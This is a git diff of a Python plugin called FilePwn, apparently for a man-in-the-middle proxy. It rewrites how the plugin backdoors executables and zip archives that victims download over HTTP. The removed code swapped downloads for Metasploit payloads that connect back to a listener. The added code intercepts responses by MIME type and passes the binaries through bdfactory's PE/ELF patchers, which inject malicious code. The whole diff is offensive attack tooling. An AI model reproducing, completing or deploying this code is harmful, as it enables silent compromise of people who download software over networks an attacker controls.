@@ -1,6 +1,21 @@
-import os,subprocess,logging,time
-from bdfproxy.bdf_proxy import *
-exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']
+################################################################################################
+# 99.9999999% of this code is stolen from BDFProxy - https://github.com/secretsquirrel/BDFProxy
+# 
+# This is just a test to see if i can actually implement it correctly!! NOT THE FINAL VERSION!!!!
+#################################################################################################
+
+import sys, os
+import pefile
+import zipfile
+from bdfactory import pebin, elfbin
+from tempfile import mkstemp
+
+
+# for now lets not read from a config file
+#try:
+    #from configobj import ConfigObj
+#except:
+    #sys.exit('[-] configobj not installed!')
 
 class FilePwn(Plugin):
     name = "FilePwn"
@@ -8,17 +23,21 @@ class FilePwn(Plugin):
     implements = ["handleResponse"]
     has_opts = True
     log_level = logging.DEBUG
-    desc = "Backdoor executables being sent over http using bdfproxy"
+    desc = "Backdoor executables being sent over http using bdfactory (STILL WORK IN PROGRESS!!)"
     
     def initialize(self,options):
         '''Called if plugin is enabled, passed the options namespace'''
+
+        self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload',
+                                'application/x-msdos-program', 'binary/octet-stream']
+        #FOR FUTURE USE
+        self.zipMimeTypes = ['application/x-zip-compressed', 'application/zip']
+
+        #USED NOW
+        self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
+        
         self.options = options
-        self.msf_file_payload_opts = "LHOST=%s LPORT=%s" % \
-                                      (options.msf_lhost,options.msf_file_lport)
-        self.payloads = {}
-        self._make_files()
-        if options.launch_msf_listener and options.msf_rc == "/tmp/tmp.rc":
-            self._start_msf()
+        #userConfig = ConfigObj('bdfproxy.cfg')
 
     def binaryGrinder(self, binaryFile):
         """
@@ -230,13 +249,19 @@ class FilePwn(Plugin):
         return aZipFile
     
     def handleResponse(self,request,data):
-        #print "http://" + request.client.getRequestHostname() + request.uri
-        ch = request.client.headers['Content-Type']
-        #print ch
-        if ch in self.payloads:
-            print "Replaced file of mimtype %s with malicious version" % ch
-            data = self.payloads[ch]
-            return {'request':request,'data':data}
+        
+        content_header = request.client.headers['Content-Type']
+
+        if content_header in self.binaryMimeTypes:
+            orig_binary = request.content.read()
+            bd_binary = self.binaryGrinder(orig_binary)
+            return {'request':request,'data':bd_binary}
+        
+        elif content_header in self.zipMimeTypes:
+            orig_zipfile = request.content.read()
+            bd_zip = self.zip_files(orig_zipfile) 
+            return {'request':request,'data':bd_zip}
+        
         else:
             return
 
